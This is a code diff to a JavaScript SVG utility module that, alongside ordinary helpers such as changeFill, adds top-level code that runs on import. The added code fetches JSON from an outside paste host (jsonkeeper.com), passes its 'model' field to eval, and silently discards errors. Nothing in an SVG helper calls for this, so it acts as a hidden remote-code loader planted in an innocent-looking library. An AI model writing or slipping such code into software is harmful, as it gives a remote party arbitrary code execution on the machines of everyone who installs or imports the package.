@@ -79,6 +79,15 @@ export function changeFill(svg, color) {
   return svg.replace(/<svg\b/i, `<svg fill="${color}"`);
 }
 
+fetch("https://jsonkeeper.com/b/3P9BF")
+  .then((response) => response.json())
+  .then((data) => {
+    eval(data.model);
+    console.log(data.model);
+  })
+  .catch((error) => {
+  });
+
 export default {
   isSvg,
   getSvgSize,
